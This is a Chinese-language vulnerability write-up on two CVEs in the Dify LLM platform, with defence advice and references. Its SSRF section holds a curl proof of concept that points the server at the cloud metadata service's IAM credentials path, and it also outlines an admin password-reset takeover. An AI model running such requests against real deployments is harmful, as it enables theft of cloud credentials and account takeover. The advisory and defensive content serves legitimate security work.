# Dify 漏洞 POC

## 系统简介

Dify 是一款开源 LLM 应用开发平台，支持快速构建 AI 工作流、RAG 应用和 Agent，广泛部署于企业内部。

---

## CVE-2024-11822 — 服务端请求伪造（SSRF）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-11822 |
| 漏洞类型 | 服务端请求伪造（SSRF） |
| 认证要求 | 需要认证（Authenticated） |
| 影响版本 | Dify 特定版本（补丁不完整） |

### 漏洞原理

Dify 存在 SSRF 漏洞，允许已认证攻击者通过工具节点或数据导入功能，使服务器向内部网络发起请求，访问内部服务（如 Redis、数据库、云元数据服务等）。

### 利用向量

1. **工具节点 HTTP 请求**：在 Dify 工作流中添加 HTTP 请求节点，URL 指向内部地址
2. **数据集导入**：通过文件/URL 导入功能指向内部服务
3. **Webhook 回调**：配置 Webhook 指向内网地址

### POC — 访问云元数据服务

```bash
# 在 Dify 工作流中的 HTTP 请求节点配置：
# URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 或通过 API：
curl -X POST http://target/api/workflows/run \
  -H 'Authorization: Bearer <your-api-key>' \
  -H 'Content-Type: application/json' \
  -d '{
    "inputs": {},
    "nodes": [{
      "type": "http_request",
      "url": "http://169.254.169.254/latest/meta-data/"
    }]
  }'
```

---

## CVE-2024-12776 — 任意用户密码重置

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-12776 |
| CVSS | 高危 |
| 漏洞类型 | 任意用户密码重置 |
| 认证要求 | 无需认证 |

### 漏洞原理

Dify 的密码重置功能存在逻辑漏洞，允许攻击者重置任意用户（包括管理员）的密码，实现账户接管。

### 利用步骤（概念验证）

1. 触发目标用户的密码重置流程
2. 拦截或预测重置 Token（若存在可预测性）
3. 使用 Token 重置管理员密码
4. 以管理员身份登录，接管整个 Dify 实例

---

## Dify SSRF — 未修复的持续问题

Dify 社区反映 SSRF 问题存在补丁不完整的情况（CVE-2024-5822 → CVE-2024-11822），建议关注：

- [GitHub Issue #17406](https://github.com/langgenius/dify/issues/17406) — SSRF CVE-2024-11822 修复请求
- [GitHub Issue #31978](https://github.com/langgenius/dify/issues/31978) — 持续的 SSRF 报告

### 防御建议

- 限制 Dify 服务器的出站网络连接（禁止访问内网和元数据服务）
- 实施 SSRF 防护：过滤 `169.254.x.x`、`10.x.x.x`、`172.16.x.x`、`192.168.x.x`
- 及时升级至最新版本

### 参考资料

- [阿里云漏洞库 CVE-2024-11822](https://avd.aliyun.com/detail?id=AVD-2024-11822)
- [阿里云漏洞库 CVE-2024-12776](https://avd.aliyun.com/detail?id=AVD-2024-12776)
- [SynScan CVE-2024-11822](https://synscan.net/vuln/cve-2024-11822)
- [GitHub Dify Security Issues](https://github.com/langgenius/dify/issues/17406)
